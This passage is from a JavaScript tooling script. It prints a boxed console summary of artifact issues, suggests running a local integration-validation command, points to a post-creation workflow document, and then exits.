    for (const issue of artifact.issues) {
      console.log(`|    - ${issue}`);
    }
  }

  console.log('|                                                          |');
  console.log('| Run validation:                                          |');
  console.log('|   node .claude/tools/cli/validate-integration.cjs --recent|');
  console.log('|                                                          |');
  console.log('| See: .claude/workflows/core/post-creation-validation.md  |');
  console.log('+----------------------------------------------------------+\n');

  process.exit(0);
}

